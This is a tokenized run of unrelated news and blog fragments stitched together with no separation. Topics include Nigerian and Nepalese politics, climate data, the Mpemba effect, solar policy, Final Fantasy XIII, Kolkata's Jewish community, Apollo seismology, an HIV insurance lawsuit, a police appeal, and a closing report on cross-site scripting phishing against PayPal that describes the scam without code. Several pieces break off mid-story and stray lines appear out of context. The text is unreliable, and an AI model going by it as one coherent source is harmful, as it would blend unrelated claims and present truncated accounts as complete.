It ’s easy to imagine military leaders taking advantage of the power vacuum to seize authority , as has happened so often in Nigerian history .
In a country – both fairly and unfairly – associated with corruption , crime and misgovernment , it ’s possible to imagine dismal scenarios emerging from this situation .
Instead , elected representatives acted to ensure stability , put in place a stable transition and deal with circumstances that would challenge any nation .
As blogger Solomon Sydelle put it on Nigerian Curiosity , “ February 9th [ the day Goodluck took power ] could possibly go down in history as a day when democratic political measures where used to take Nigeria one step further down the path to becoming a true democratic nation . ”
Here ’s hoping a Goodluck presidency shows that Nigeria is a nation ruled by laws , not by the whim of those who can seize power … and that the rest of the world sees that Nigeria is a country coping with a tough situation and handling it with grace and stability .
On a whim , I ’ve been looking at sorting surface station data for quality according to UAH satellite data .
It ’s a process which , if done right , could have either validity or be used as a method cherry picking – [ sarc ] an advantage unique to climatology [ / sarc ] .
In messing around I sorted ground data against the final UAH global average , throwing out stations below a correlation threshold .
As expected , I was able to generate beautiful UAH curves with every wiggle and shape by selecting the ‘ right ’ temperature stations .
Only somewhat surprisingly the trends returned were double the UAH trend – below .
Anyway , the results above are nothing but junk that happens to have the same shape as UAH .
I began to look at sorting according to a gridded UAH series .
On NicL ’s suggestion , I correlated each stations gridcell to the surrounding gridcells in order to account for weather patterns .
If the prevailing winds on a sea shore station predominantly carry inland air across the station , you might correlate better to a gridcell which has more inland area .
The next graph is the gridded GHCN global trend since 1978 – no sorting involved .
One thing I noticed is that the blue color stations predominantly sit along shorelines .
The second plot below is the same data sorted by removing anything with lower than 0.6 correlation .
Most of the light blue stations correlated poorly to UAH .
There is almost a band of stations across the equator +/- 20 degrees which lost all stations based on poor correlation to UAH .
Remember , in a recent post NicL also noted the poor correlation of UAH to sea surface temperatures .
This makes some sense since while SST affects the lower troposphere , the satellites measure a substantial air thickness and it would take time to conduct / convect the heat from the sea surface through the whole thickness .
I then plotted the correlation vs latitude .
Regulars here may remember John Christy ’s amplification factor between UAH and surface measurements .
He recommends a value of 1.2 times ground for everything except the tropics +/- 20 degrees where the value is 1.3 .
This represents the dampening factor of the decadal variance .
If you ’re familiar with the effect , I now wonder if the tropical difference in amplification factor is a result of the difference in proximity of the tropcial stations to the ocean .
IOW , looking at the geography in equatorial regions , many of the stations are positioned closer to the ocean such that trade winds would cause additional dampening of surface level measurements in comparison to the lower troposphere sat measurements .
The increased tropical surface temperature dampening effect may be due to nothing other than geography .
Read here .
Sea surface temperatures off the coast of Northern Iceland were significantly higher during ancient periods , despite low levels of atmosphere CO2 .

Freezing depends on impurities ( Vilhjalmur Ingi Vilhjalmsson / Getty )
HOT water sometimes freezes faster than cold water – but why ?
This peculiar phenomenon has baffled scientists for generations , but now there is evidence that the effect may depend on random impurities in the water .
Fast - freezing of hot water is known as the Mpemba effect , after a Tanzanian schoolboy called Erasto Mpemba ( see “ How the Mpemba effect got its name ” ) .
Physicists have come up with several possible explanations , including faster evaporation reducing the volume of hot water , a layer of frost insulating the cooler water , and differing concentration of solutes .
But the answer …

David Roberts wants to see distributed generation taken seriously .
He ’s getting his wish .
Let the era of solar wholesale distributed generation begin .
Last Thursday , the California Public Utilities Commission approved a resolution to implement the auction portion of Southern California Edison ’s Distributed Generation PV program .
This is a big deal –the door is now open for a competitive bidding process for 250 MW of solar photovoltaics from independent solar developers ( of 1 to 2 MW in size , 90 % of which must be rooftop ) over the next few years .
First auctions should begin in the next month or two .
More importantly , this is the beginning of what will be a wave of wholesale distributed generation in the state .
To recap , almost 2 years ago , SCE applied to regulators for permission to build and own 250 MW of distributed solar .
Solar advocates made the argument that this should be conditioned on opening market opportunity for independent solar developers to provide the same value to ratepayers–and in the end , the Commission agreed .
The final decision required SCE to buy an equal amount –250 MW–from independent solar developers ( for a combined total of 500 MW ) .
Decision here .
( For the curious or masochistic , all docs in proceeding here ) .
Importantly , much work on the auction process and standard contract terms and conditions were worked out last fall .
This is a key element .
Drafts available here but were modified ( mostly for the better ) by the final decision .
Pacific Gas and Electric has proposed a similar program , which should wrap up by February .
With a lot of issues worked out in the SCE process , once ( if ) approved , PG&E ’s program should be able to launch fairly quickly .
This is another 500 MW ( 250 utility owned , 250 from independent power producers , in the 1 - 20 MW range ) .
In the same vein , the Administrative Law Judge on the proposed 1 GW market - based feed - in tariff could decide shortly ( knock wood ) , and if there are no bumps from the trajectory that the staff proposal laid out , a functional program for 1 GW of 1 - 10 MW sized renewables over the next four years could be launched before summer .
Total , that ’s at least 2 GW over the next few years .
But I expect that more will come in under the state ’s regular RPS process , and as ( or , if ) these programs prove successful , they can be modified and increased .
Success begets success .
Mr Koirala was a prominent politician for decades
The former Nepalese Prime Minister Girija Prasad Koirala has died in Kathmandu , his aides and state TV say .
Mr Koirala , 86 , served four terms as PM with the Nepali Congress Party and led protests that brought down King Gyanendra 's authoritarian rule .
Thousands of supporters had gathered outside his daughter 's house where he was taken after being in hospital for several days .
Mr Koirala 's political career spanned seven decades .
He first came to prominence as a union leader in the late 1940s , and he was imprisoned , exiled or detained on numerous occasions for championing the cause of democracy against various autocratic regimes .
Leadership stints
In 1960 , he was jailed for eight years for his pro-democracy views .
G P Koirala , as he was popularly known , first became prime minister in the country 's first democratic elections in 1991 .
His government lasted three years , and collapsed after a no -confidence vote .
He played a key role in public demonstrations in the early 1990s to end the absolute powers of the king .
In 2000 he returned as prime minister , heading the ninth government in 10 years .
It was during that term that in 2001 , King Birendra was murdered by his son - along with nine members of his family .
By July 2001 Maoist rebels had stepped up a campaign of violence , prompting Prime Minister Koirala to quit over the violence .
Peace agreement
Five years later he was appointed prime minister by King Gyanendra who reinstated parliament following weeks of violent strikes and protests against direct royal rule .
Koirala was a mass leader and a statesman , whose knowledge and wisdom guided the polity of Nepal in the right direction at critical junctures in the country 's history
Manmohan Singh
Indian Prime Minister
Your memories and tributes
He was too sick to attend rallies celebrating the resumption of parliament , having suffered from respiratory problems for years .
In May 2006 Parliament voted unanimously to curtail the king 's political powers .
The same month , the government and Maoist rebels began peace talks , the first in nearly three years , resulting in a peace accord by November 2006 .
The Comprehensive Peace Agreement ( CPA ) declared a formal end to a 10 - year rebel insurgency .
Mr Koirala was also acting head of state in 2008 before the election of Nepal 's first president .
Mr Koirala 's body will lie in state at the national stadium on Sunday , with his funeral later in the day at the Pashupatinath Hindu temple in Kathmandu , his aide Gokarna Poudel said , according to AFP news agency .
Indian Prime Minister Manmohan Singh expressed condolences .
" Koirala spent his entire political life championing the cause of the people ... "
Mr Singh said .
" Koirala was a mass leader and a statesman , whose knowledge and wisdom guided the polity of Nepal in the right direction at critical junctures in the country 's history . "

Sex in the Service of Aphrodite Did Prostitution Really Exist in the Temples of Antiquity ?
" Holy harlots " in Jerusalem , temple sex in the service of Aphrodite ?
Many ancient authors describe sacred prostitution in drastic terms .
Are the accounts nothing but legends ?
Historians are searching for the kernel of truth behind the reports .

In a desperate attempt to explain away the violent actions of the Tea Party , Fox News contributor Liz Trotta claimed the left wing invented violent dissent .
No , really , Trotta said , “ You know the left wing virtually invented violent dissent during the 1960’s . ”
In the bizzaro world of Fox News people like Martin Luther King and Bobby Kennedy invented violent dissent .
Here is the video courtesy of Media Matters :
Trotta was trotted out to blame the media for exaggerating the Tea Party violence , but first she started off with this doozey , “ Well , you know , the left wing virtually invented violent dissent going back to the 1960s , so to hear everybody wildly exaggerate and embroidering everything that has happened in Washington is really laughable , and the media has been suckered into it . ”
According to Fox News the fact that African American members of Congress were spit on , and had racial slurs hurled at them is an exaggeration perpetuated by the foolish media because we all know that angry white people would never do .

There is no historical precedent for that at all :
It is not like the left was led in the 1960s by a man who preached non violence :
Once again , Fox News tried to whitewash history in order to cover up for the deplorable behavior of their angry white mob .
The media has not exaggerated these stories , and by trying to explain them away Fox is not only condoning the violence , but also setting the stage for more to occur .
Even if it was possible for the left wing to have invented violent dissent , it still would not justify the recent actions of certain members of the Tea Party .
Fox News and the GOP have tapped into the worst elements on the right , and they have no amount of revisionist history can erase their responsibility for enabling hate .
The rumours are true .
Final Fantasy XIII on Xbox 360 is n't anywhere near as impressive as it is on PlayStation 3 .
The real kicker is that it 's a lot worse than it should have been .
Square Enix 's latest epic - 4.5 years in the making - follows on the basic principles established by all of its PlayStation predecessors in combining an excellent 3D engine along with vast amounts of pre-rendered CG .
This presented two very difficult issues for the developers tasked with porting an already mature PS3 work - in - progress over to the Xbox 360 .
Firstly , the Crystal Tools engine needed to be translated across to the Microsoft platform .
Secondly , the team had to find a way to compress over 32 GB of CG to fit within the confines of three Xbox 360 DVDs - squeezed already by a copy protection mechanism that limits available space to a meagre 6.8GB , less than the storage potential of both PlayStation 2 and Wii .
The sheer idea of porting over a massive Blu-ray game like this onto the Xbox 360 seems like lunacy , but the good news from a conversion perspective is that the game itself is extremely linear .
The core basis of the majority of the game is in negotiating very limited environments with just a few branching routes , following a yellow arrow to get to your next destination and fighting a myriad bunch of enemies as you do it .
Very rarely are you asked to return to previous locations - with just one chapter in the game dedicated to the sort of free - roaming JPRG gameplay for which Final Fantasy is renowned .
That being the case , while you can install all three discs to hard drive for a seamless experience , there really is little point over and above the convenience and noise - reduction elements .
Disc - swapping on Xbox 360 is kept to an absolute minimum and has next to no impact on the experience of playing Final Fantasy XIII .
Ironically then , one of the main concerns about the conversion proves to be of little consequence at all .
Unfortunately , the other niggling worries are of far greater significance .
Xbox 360 owners can install the whole game to hard disk , but the advantages are minimal .
The process of swapping discs is fairly unobtrusive .
Built from the ground upwards with an eye towards the storage limitation of the disc , and with the different architectures of the two HD consoles firmly in mind , Square Enix would have stood a good chance of getting the game looking pretty much like - for - like on both platforms .
However , by just about every measurable criteria , it seems that the Xbox 360 version of Final Fantasy XIII is a quick port where the existing PS3 material has been very roughly manhandled and bludgeoned into shape in order to work on the Microsoft console .
First up , let 's talk about the Crystal Tools engine .
Square mentioned in an interview with the Dutch Official PlayStation Magazine that a " new engine " had to be coded up for Xbox 360 , but it seems to look and act very much like the PS3 one , with just a couple of very noticeable differences .
Let 's talk about the resolution then .
A smattering of European and US - based websites have published pre-release Xbox 360 shots , showing a considerable drop in definition with some galleries exhibiting a somewhat washed - out look .
The problem with drawing conclusions from media - derived assets is that there 's little transparency in what tech they use to take their shots .
Some grabs even appeared to have mouse pointers on them , indicating that some sort of PC " print screen " function was used in their making .
However , experienced eyes out there know a legit shot when they see one , and soon the Xbox 360 version was being reported as 1024x576 , with 2 x multi-sampling anti-aliasing .
This is up against native 720p on the original PlayStation 3 version , again with the same 2 x level of MSAA , representing a fairly enormous drop of around a third of the overall resolution .
So , are the stories about a reduced resolution on FFXIII 360 true ?
You betcha .
For those curious about how we can be so certain , the principles of pixel - counting are pretty much foolproof .
On a 720 p game , a diagonal line 20 pixels in height will have 20 distinct steps from top to bottom .
When you look at FFXIII , there clearly only 16 .
So ... ( 16/20 ) x 720 gives you a vertical resolution of 576 pixels .
The same principles - and indeed ratios , in this case - apply to the other axis , giving horizontal resolution of 1024 pixels .
The only slight confusion here could come from the HUD , which is rendered at normal 720 p resolution before being overlaid on top of the 576 p image .
This has been standard practice for many years now with sub -HD titles , and FFXIII is no different .
So sub-HD and 1024x576 it is then .
Now , with careful handling and superior texture filtering , sub -HD stands a very good chance of competing with native 720 p - as Tekken 6 demonstrates .
However , Namco 's game is pretty much unique in being the only console title running at a lower resolution that looks demonstrably sharper than when it 's running at 720p .
Unfortunately , the resolution reduction here seems to be all about converting across the PS3 engine as quickly and easily as possible , and that means accessing as much of the console 's power with the lowest amount of aggravation .
That being the case , it looks as though Square Enix was keen to maintain the entire framebuffer within the Xbox 360's 10 MB eDRAM for optimum processing speed without the need to " tile " multiples of that 10 MB into main RAM .
Mirroring PS3 resolution and anti-aliasing would require two tiles , introducing potential performance bottlenecks on elements that occupy both tiles .
This is n't really an issue for most cross-platform developers ( Fallout 3 and DiRT 2 , for example , use three tiles to accommodate superior 4 x MSAA ) , but the only plausible explanation here is that Square Enix had issues getting Crystal Tools working on 360 and down - scaled the framebuffer as a result of that .
So , with a focus on footage generated just by Crystal Tools itself , let 's take a look at how the Xbox 360 and PS3 versions of Final Fantasy XIII measure up to one another .
Remember to use the full - screen button to get HD resolution , or else use the EGTV link for a larger , more useful window .
Alternatively , peruse this colossal comparison gallery of over 50 shots .
" Adequate but a touch disappointing " best sums up the Xbox 360 version .
Fine edges lose precision , and while the effect is mitigated thanks to the MSAA along with the multitude of post processing effects the engine has at its disposal , the fact is that the lack of resolution can make the 360 build look sub-par .
The clean CG look of the PS3 game in motion is unduly compromised , and while it 's still a handsome enough title on Xbox 360 , it lacks the pristine presentation of its sibling .
It could have been worse though .
As you may have noticed in the movie , the quality of the scaling when watching the game in motion is n't bad at all .
'' And , of course , the bankers never really lose .
If you win the game a banker 's voice says : ' You win .
We retire .
Thank you very much to the taxpayer for paying our pensions ' . ''
Kolkata , India ( CNN ) --
At 65 , Ian Zachariah is one of the youngest ones left .
" Can you believe it ? " he says , adjusting a borrowed yarmulke in a now - empty synagogue .
His eyes scan the glittering stained glass , the blue - domed ceiling and the rows of dark wood and wicker benches , still arranged the way they were when , decades ago on the Sabbath , Maghen David was teeming .
His mind races back to his childhood , when he occupied a seat in the back left - hand corner and much to his father 's chagrin , gazed upward to the second floor gallery where the girls and women sat .
But a hush has fallen within Maghen David 's walls .
There have not been prayers said here in a long time , for the lack of 10 able - bodied men needed to form the minyan , the quorum required for a Jewish service .
Zachariah 's heart feels empty like the synagogue 's pews .
He knows the end is near for the Jews of Kolkata .
Once a thriving community of 6,000 , their numbers can be counted on fingers now .
Zachariah says fewer than 30 Jews are left in this bustling eastern Indian metropolis .
Many Jews began leaving Kolkata , the city formerly known as Calcutta , after Indian independence in 1947 ; those who remained are slowly dying off .
Zachariah , a stalwart of the dwindling community , serves on practically every Jewish administrative board .
There are simply not enough people left to go around .
" Things have to be kept going , " he says of the cultural burden weighing heavy on his shoulders .
" We 're not lying down and waiting for the sunset . "
He runs his fingers over the cold outdoor oven at Maghen David that once turned out fresh unleavened bread .
He peers through a window into the basement where vats of wine were stored .
From a wooden box , he picks up a book of prayer , the pages eaten with precision by bookworms .
" I always thought someone should take these away .
Too late now .
They are all in terrible shape . "
Zachariah 's ancestors arrived in India in the 18th century from the Syrian cities of Aleppo and Damascus .
Others came from Iraq and Iran .
All of them came to be known as Baghdadi Jews in India .
They came to British India to trade -- in jewels , spices , textiles , tobacco , tea .
They made a name as exporters and real - estate dealers and bakers .
India , said Judaism scholar Nathan Katz , was one of the few places in the world that was inherently hospitable to its Jews .
In Kolkata , Jewish families settled in what was known as " gray town , " the central city neighborhoods that separated the whites from the " coloreds . "
They built graceful buildings that lined Brabourne Road in the heart of what is today Badabazaar , Kolkata 's largest wholesale market .
Jewish settlers to Kolkata eventually built five synagogues , at least two schools and a hospital .
The schools are still operational , though not one student is Jewish .
The Beth El and Maghen David synagogues exist today more as memorials to a former era than as functional Jewish temples .
They established a landmark bakery , Nahoum and Sons , in New Market , a favorite among Jews and gentiles alike who craved its fruit cake , cream rolls and lemon tarts .
It , too , like every other Jewish institution , faces a perilous future -- the last of the family in Kolkata , David Nahoum , is 84 and frail .
" They were so well integrated into the upper class of Bengali culture , " said Katz , a professor of religious studies at Florida International University who has done extensive research on the Jewish communities of India .
But then came Indian independence and the birth of Israel the following year .
The Jews began their exodus .
" A new social and economic order came to into being and their prospects began to dry up , " Katz said .
By his estimate , the 12,000 Baghdadi Jews in all of India in 1947 have now dwindled down to less than 100 .
In a nation of 1.1 billion people , they do n't even qualify as a minority group anymore -- barely a blip .
" It was a beautiful culture , " Katz said .
" I find it terribly sad . "
Katz said Jewish communities have died violent and forced deaths in other places .
Ironically , in India , where they did not face persecution , they left of their own accord .
That 's what makes the tale more poignant .
It 's not that someone forced the clock on the Maghen David tower to stop -- it just did one day .
At 3:30 .
No one knows the date , though the typewritten notices posted for a board meeting give a clue .
The paper is yellow and frayed .
" 21st May , 1989 . "
It was probably that way when Rahel Musleah journeyed back to Kolkata in 1997 to cement the shadowy images of a way of life she had heard about .
Her father , Ezekiel Musleah , 82 , was a rabbi at Maghen David who saw prospects for his family dry up .
" It was very difficult to leave .
But what can a rabbi do in a community that was dying ? " he asked .
He began a new life in Philadelphia , Pennsylvania , in 1964 , determined to carry on the music , the food , the spiritual norms that had taken root from a mix of Middle Eastern and Indian traditions .
Rahel Musleah , a 52 - year - old freelance writer who lives in Great Neck , New York , recalled her parents speaking Hindustani at home and celebrating birthdays with rasagollahs , a sugary Bengali confection .
Women in the synagogue taught her mother -- who had relied on a cook in Kolkata -- to prepare Ashkenazic dishes including chopped liver , brisket and matzo balls .
She also learned to replicate the Baghdadi - Indian specialties that her family craved .
The stories Musleah heard about Kolkata finally drew her back to the house at 11 Bowbazar Street that bore her grandfather 's name : I.S. Musleah .
Her great - aunt Ramah was the only one left in the house .
Musleah wandered around the dark rooms of the ancestral home , filled with heavy rosewood furniture and photographs of generations gone by .
There , among the wedding pictures of her grandparents and aunts , she found her own .
Rahel Musleah sipped tea from butter - yellow cups with her aging Aunty Ramah and feasted on deep - fried kachuris and heart - shaped " queen cakes " from Nahoum's .
On the Sabbath , she sat in dim morning light at Maghen David , closed her eyes and tried to imagine her grandparents and all the people who had come before her .
She tried to picture what was still vivid in her father 's mind .
" What sadness for my father to sit and walk where in his bones , in his heart and soul , he felt the closeness of everyone he loved .
...
All dead now , " she wrote in an article about her trip .
Rahel Musleah returned to Kolkata one other time with her sister several years ago .
Two months after that trip , her Aunty Ramah died , severing her last link to that culture .
She retrieved the wooden sign from the house bearing her grandfather 's name .
It now hangs in her home , above her grandparents ' portraits .
The Jews who are left in Kolkata can do little but watch a way of life disappear .
Zachariah thinks he might devote time to establishing a museum showcasing Jewish history ; he wants to ensure that the Archaeological Society preserves standing synagogues .
" I do n't think there will be a next generation , " he says .
Kolkata , he says , was the kind of place that absorbed everyone .
Evidence of that tolerance can be found on the same corner as Maghen David , where land is shared by a Christian church , a Hindu shrine and a Muslim mosque .
" Time marches on .
People come .
People go .
When it was over here , they left , " Zachariah says .
It is 1 p.m .
And at that hour , Zachariah 's voice gives way to the muezzin 's call to prayer .
In April , the Apollo 13 Saturn V blasted off towards the Moon .
The Saturn rocket consisted of a 3 - stage launching system .
While the first and second stage of the launch vehicle dropped back to Earth after launch , the third stage ( S - IVB ) was used to propel the docked Apollo Command Module and Lunar Module from Earth orbit into a lunar trajectory .
The spent rocket booster then separated from the Command Module and later impacted the Moon .
From the tracking of the radio signals of the rocket , the impact locations on the Moon and the impact times were fairly well known .
Seismogram of the Apollo13 S-IVB impact recorded at the Apollo 12 seismic station in digital units ( DU ) .
The three traces designate the signal of the 3 orthogonal components of the ground motion at long wavelengths .
The arrows mark the arrival times of the p ( primary ) and the slower s ( secondary ) seismic waves ( image modified from : Ewing , M. , et al. , ( 1971 ) , Seismology of the Moon and implications on internal structure , origin and evolution , in : De Jaeger ( Eds. ) : Highlights of Astronomy , IAU , pp.155-172 )
The impacts by the S - IVB stages represented unique calibration signals for the Apollo seismic station network , which operated on the lunar surface from 1969 - 1977 .
Since the rocket impacts occurred at known times and places , the seismic wave velocities , in particular those within the upper lunar crust could be measured directly .
At the time of the Apollo 13 mission , only the seismometer at Apollo 12 was available , which had been deployed 5 months earlier .
The S - IVB impact occurred at a distance of 135 km from that seismic station .
Analysis by the LROC team now have identified the craters associated with most of the rocket impacts in their predicted areas .
Taking advantage of the precise LRO orbit and LROC pointing knowledge , it is now possible to determine the impact coordinates of rockets and their distances from the seismic stations more accurately to within a few hundred meters , over time as the orbit calculations are improved these estimates will in turn become more accurate .
The precise impact coordinates may warrant a reanalysis of the seismic calibration data for improved models of seismic wave propagation within the Moon and the Lunar interior structure .
The seismograph network recorded more than 13,000 seismic events and delivered some of the most important scientific results of the Apollo missions .

Tasmanian devils have given rise to a weird new quasi - form of life : a cancer that spreads from animal to animal like a parasite .
In tomorrow 's New York Times , I report on the latest analysis of devil 's facial tumour disease , published in this week 's Science .
Scientists have now tracked down the cancer to its progenitor : nerve cells known as Schwann cells .
Now scientists can use this evolutionary history to design diagnostic tests for the cancer and perhaps even vaccines .
Let 's hope they succeed -- the cancer has wiped out 60 percent of all Tasmanian devils since 1996 and has the potential to drive the whole species extinct in a matter of decades .
For more on cancer as a new form of life , check out my earlier blog post on the only other documented case in the wild : a tumor that jumps from dog to dog .
( The one major update to that post is that it now looks as if the tumor escaped its original dog host thousands of years ago , instead of hundreds as previously thought . )
While dogs and Tasmanian devils are so far the only known hosts to these sorts of cancer , free - ranging tumors may actually be more common than we know right now .
They may be particularly likely to arise in small , inbred populations .
The similar immune systems of these animals may be easy for the cancer to evade , allowing it to spread quickly .
Another hint that infectious cancer is n't all that rare is the violence with which we reject transplanted organs .
Why should our bodies be so well - primed to attack the cells of other humans ?
One possibility is that invasive cancers have been a long - term threat to the health of our ancestors .

The Best American Science Writing 2008 )

Due for downloadable release next week ( unfortunately , in Japan only ) , Rittai Kakushi e Attakoreda ( which , via Tiny Cartridge , roughly translates to Hidden 3D Image : There It Is ! ) probably comes as close as anything we 've seen so far to answering that long - burning question , " What 're the cameras on the DSi really for ? "
Augmented reality games have n't quite flourished , " print club " distractions do n't hold much sway in the West — but achieving good Johnny Lee- style 3D by motion tracking via the DSi's front - mounted camera is something we can all get on board for , even if it 's just for the simple paper - cut hidden object minigame Attakoreda offers .
Rittai Kakushi e Attakoreda is out next Wednesday , March 3rd — I 'll update then with a report on just how well it works .
Fox News coverage is aimed towards Republicans and MSNBC is aimed at Democrats .
I ’d like cable news network aimed at Libertarians .
If being liberty - minded catches on , there will be a market for news Libertarians find important .
There is some Libertarian coverage on the networks now–and the coverage seems to be growing .
Libertarians are let into the media pool for an hour each week with John Stossel ’s show on Fox Business News .
CNN has been throwing in Libertarian - leaning guests on their shows .
I appreciate CNN for bringing Penn Jillette and Ron Paul into their discussions .
Lip service from the major outlets does n’t cut it , though .
There is still a need for a network with a Libertarian bias .
As Penn Jillette put it while discussing his show Bullshit ! , “ We are trying to be fair and extremely biased . ”
That ’s what I want : factual reporting , unashamedly biased towards liberty –a network where reporters are required to ask politicians , “ Will this lead to more or less freedom ? ”
Reporters that will challenge the “ majority of people want this legislation ” with questions about the tyranny of the majority .
While a politician is speaking , I want the bottom of the screen to scroll the biggest donors to their campaigns .
I want a cha ching sound when tax increases or incentives are mentioned and chain rattle when victimless crimes are mentioned .
When an election is mentioned , all the candidates for office will be listed , but in freedom - minded order .
If there had been a network with a Libertarian bias , Joe Kennedy would have been mentioned on - air before the Massachusetts special election was held , instead of as a footnote afterward when the results had been tallied .
Polling for the Libertarian Network would be freedom - biased :
What is the least popular government program ?
Do you feel more free now than you did four years ago ?
Rate how much federal servitude interferes with your life : [ none / somewhat / too much / ready for a revolution ]
Why do you feel Washington hates you ?
A nightly lineup of opinion shows would include people like Penn Jillette , Drew Carey , John Stossel and Larry Elder .
Have the people over at Free Talk Live do specials on police abuses .
And …last but not least , the hosts and guests could drink and smoke on the air if they choose .
I did freelance database design and data entry .
I once had a client on Wall Street who hired me to do data entry on his client and prospect list .
Client : I need a bunch of data entry done tonight .
Would you mind working outside your normal hours ?
It ’s an emergency .
Because he had been a good client I agreed at my overtime rate .
Client :
The files are in an envelope on my desk .
Just pick them up from my office .
I picked up the envelope and got to work .
The files were there … along with a set of photos of his wife .
First , his wife in a dress .
Then in a bikini .
Then performing various sex acts with multiple men .
The client was nowhere in the pictures , which somehow makes sense to me .
I never mentioned it and neither did he .
He paid the bill , and then I never returned his calls .
Krugman : Situations like this will ‘ get much worse ’ without health care reform
Health insurance companies have become notorious for dropping coverage of clients with pre-existing conditions or those whose health problems become costly .
But rarely has an insurer been accused of systematically targeting an entire class of people suffering from a particular condition .
ADVERTISEMENT
But that is exactly what Assurant Health stands accused of , after recently released court documents reportedly show the company used complex computer algorithms to single out HIV patients and deny them health coverage .
Government regulators call the company ’s behavior “ unprecedented . ”
A report from Reuters news service states that recently released court documents from a 2004 lawsuit by an HIV - positive college student reveal that Assurant , at the time known as Fortis , “ had a company policy of targeting policyholders with HIV . ”
Reuters reports :
A computer program and algorithm targeted every policyholder recently diagnosed with HIV for an automatic fraud investigation , as the company searched for any pretext to revoke their policy .
As was the case with Mitchell , their insurance policies often were canceled on erroneous information , the flimsiest of evidence , or for no good reason at all , according to the court documents and interviews with state and federal investigators .
The news comes as the long - running health care reform debate edges closer to resolution .
President Barack Obama , who has been campaigning in Washington and around the country to pass a health care reform package , has recently taken to strongly criticizing health insurers .

Writing in the New York Times , Nobel - winning economist Paul Krugman argues that Fortis ’ policy on HIV highlights the crucial issues at stake in the health care reform debate .
The crucial thing to understand is that depending on how a few Democrats vote sometime soon , stories like this will either cease happening — or continue , and get much worse .
The proposed health care reform would end discrimination based on pre-existing conditions , and therefore end the threat of rescission as well .
The court case that revealed the insurer ’s HIV policy involves Jerome Mitchell , who as a 17 - year - old college student in 2002 contracted the HIV virus , and was soon informed by Fortis that his policy had been canceled .
He sued , and in 2004 won a $ 15 - million judgment that was later reduced to $ 10 million .
ADVERTISEMENT
The court documents involved in his lawsuit against Fortis were sealed by a judge , but Reuters obtained several opinions from appellate judges overseeing the insurer ’s appeal of the verdict .
“ We find ample support in the record that Fortis ’ conduct was reprehensible , ” wrote South Carolina Supreme Court Chief Justice Jean Toal , as quoted at Reuters .
“ Fortis demonstrated an indifference to Mitchell ’s life and a reckless disregard to his health and safety . ”
ADVERTISEMENT
Michael G. Nettles , a state circuit judge for the 12th Judicial District of South Carolina , wrote that Fortis “ gambled ” with Mitchell ’s life .
“ The court finds that Fortis wrongfully elevated its concerns for maximizing profits over the rights and interest of its customer , ” the judge wrote in his decision .
Now in his new crusade to oppose everything President Obama is for , John McCain has chosen the signatories of a letter signed by " over a thousand retired and flag general officers , " among other folks .
According to McCain , in a letter , thousand officers brought their support to the DADT Policy .
I guess McCain thought that no one would notice some " bizarre " facts linked to this letter .
In fact , as reported by ThinkProgress ' Amanda Terkel , McCain is now a ghost whisperer .
Maybe he was Misled once again .
Here some problems , identified by Amanda Terkel , with the letter in question :
– The average age of the officers is 74 .
The " oldest living signer is 98 , and several signers died in the time since the document was published . "
Servicemembers United Executive Director Alex Nicholson added that only " a small fraction of these officers have even served in the military during the ‘ Do n’t Ask , Do n’t Tell ’ period , much less in the 21st century military , " so it ’s hard to believe that they " know how accepting and tolerant 18 - and 21 - year - olds are today . " – " At least one signer , Gen. Louis Menetrey , was deceased when the letter was published and did n’t sign the document himself .
According to a footnote on the letter , his wife signed the document for him after his death using power of attorney — six years after Alzheimer ’s disease robbed him of the ability to communicate . "
–
One signatory said that they " no longer want to be a part of the letter , writing to the organization , ‘ I do not wish to be on any list regarding this issue . ‘" – Multiple generals said they " never agreed " to sign the letter in the first place , writing " I never agreed .
To represent either side of this issue " and " I do not remember being asked about this issue . "
–
At least seven officers " were involved in scandals tarnishing their careers . "
Gen. Carl Mundy , for instance , gained negative publicity when he told CBS ’s 60 Minutes that " minority officers do not shoot as well as the non-minorities . "

A man who throws animal semen on schoolgirls is being hunted by police today following the latest attack .
Detectives in Bury , Greater Manchester , described the assaults as " disgusting " with the same suspect following the unsuspecting teenage girls and some of them later discovering they had been smeared with the liquid .
There have now been six separate incidents , the first last November and the latest just last week , but police have now issued a CCTV image of a man they wish to speak to .
Det Insp Lynne Vernon , from Greater Manchester Police , said : " We have six separate incidents and do not know the motivation behind them - while we do not want people to be frightened unnecessarily , we are taking these reports seriously .
" None of the victims was physically harmed in anyway but this is still a disgusting act and the person responsible must be caught .
" I 'd ask people to take a good look at this image and if you know anything about this man , please contact us .
" He is not necessarily connected to all of the incidents but we would like to speak to him as part of our inquiries "
The first victim , a 14 - year - old girl , was walking along Kennedy Drive in Unsworth , Bury , around 3.20 pm on Friday November 13 last year .
After getting off the bus home from school she was followed down a ginnel by a man who asked her the time and was standing uncomfortably close to her .
When she arrived at home , she noticed a sticky liquid on the back of her tights .
The substance was analysed by police and later identified as animal semen .
Between 8.05 am and 8.20 am on Monday December 7 , a 15 - year - old schoolgirl was walking along with her sister and was approached from behind by a man on Ostrich Lane , Prestwich .
She felt a liquid on the back of her tights and the man walked off between her and her sister and away from the girls .
Also between 8.05 am and 8.20 am that day , another 15 - year - old girl walked past a man who turned around and followed her on to St Mary 's Road .
Just after 4 pm on Thursday December 17 , a 14 - year - old girl was in a shop on Mill Gate , Bury , with her mother when a man bumped into her and wiped a white substance on her bottom .
At about 2 pm the next day , a man followed two 13 - year - old girls on Bury Old Road , near to the M60 in Prestwich .
In the latest attack , shortly before 9 am on Monday January 25 , a man approached two girls , aged 15 and 16 , on Pinfold Lane , Whitefield , and asked them the time .
As they walked away one of the girls noticed liquid dripping from her skirt .
In each incident , the offender was described as being a white man , aged between 25 and 35 and was carrying a bag .
On a couple of occasions , he was wearing a hat , possibly with earflaps .
A security flaw in the PayPal web site is being actively exploited by fraudsters to steal credit card numbers and other personal information belonging to PayPal users .
The issue was reported to Netcraft today via our anti-phishing toolbar .
The scam works quite convincingly , by tricking users into accessing a URL hosted on the genuine PayPal web site .
The URL uses SSL to encrypt information transmitted to and from the site , and a valid 256 - bit SSL certificate is presented to confirm that the site does indeed belong to PayPal ; however , some of the content on the page has been modified by the fraudsters via a cross - site scripting technique ( XSS ) .
The genuine PayPal SSL certificate used by the scam
When the victim visits the page , they are presented with a message that has been ' injected ' onto the genuine PayPal site that says , " Your account is currently disabled because we think it has been accessed by a third party .
You will now be redirected to Resolution Center . "
After a short pause , the victim is then redirected to an external server , which presents a fake PayPal Member log -
In page .
At this crucial point , the victim may be off guard , as the paypal.com domain name and SSL certificate he saw previously are likely to make him realise he has visited the genuine PayPal web site – and why would he expect PayPal to redirect him to a fraudulent web site ?
Fraudsters manipulating content on genuine PayPal site
